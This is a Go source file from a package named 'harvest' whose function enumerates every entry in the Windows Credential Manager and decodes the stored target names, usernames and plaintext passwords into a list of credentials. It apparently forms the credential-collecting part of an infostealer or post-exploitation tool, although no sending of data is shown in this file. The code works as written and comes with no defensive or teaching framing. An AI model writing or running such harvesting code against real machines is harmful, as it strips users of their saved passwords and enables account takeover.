//go:build windows
// +build windows

package harvest

import (
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Windows Credential Manager structs
type credentialW struct {
	Flags              uint32
	Type               uint32
	TargetName         *uint16
	Comment            *uint16
	LastWritten        windows.Filetime
	CredentialBlobSize uint32
	CredentialBlob     *byte
	Persist            uint32
	AttributeCount     uint32
	Attributes         uintptr
	TargetAlias        *uint16
	UserName           *uint16
}

var (
	modAdvapi32         = windows.NewLazySystemDLL("advapi32.dll")
	procCredEnumerate   = modAdvapi32.NewProc("CredEnumerateW")
	procCredFree        = modAdvapi32.NewProc("CredFree")
)

func collectWinCred() []Credential {
	var count uint32
	var creds uintptr

	r, _, _ := procCredEnumerate.Call(0, 0, uintptr(unsafe.Pointer(&count)), uintptr(unsafe.Pointer(&creds)))
	if r == 0 {
		return nil
	}
	defer procCredFree.Call(creds)

	var out []Credential
	credPtrs := (*[1 << 20]*credentialW)(unsafe.Pointer(creds))[:count:count]
	for _, c := range credPtrs {
		if c == nil {
			continue
		}
		target := ""
		if c.TargetName != nil {
			target = syscall.UTF16ToString((*[1 << 16]uint16)(unsafe.Pointer(c.TargetName))[:])
		}
		user := ""
		if c.UserName != nil {
			user = syscall.UTF16ToString((*[1 << 16]uint16)(unsafe.Pointer(c.UserName))[:])
		}
		pass := ""
		if c.CredentialBlob != nil && c.CredentialBlobSize > 0 {
			blob := (*[1 << 16]byte)(unsafe.Pointer(c.CredentialBlob))[:c.CredentialBlobSize:c.CredentialBlobSize]
			// Blob is UTF-16LE for generic creds
			if c.CredentialBlobSize%2 == 0 {
				u16 := make([]uint16, c.CredentialBlobSize/2)
				for i := range u16 {
					u16[i] = uint16(blob[i*2]) | uint16(blob[i*2+1])<<8
				}
				pass = syscall.UTF16ToString(u16)
			}
		}
		if user != "" || pass != "" {
			out = append(out, Credential{
				Source:   "wincred",
				URL:      target,
				Username: user,
				Password: pass,
			})
		}
	}
	return out
}
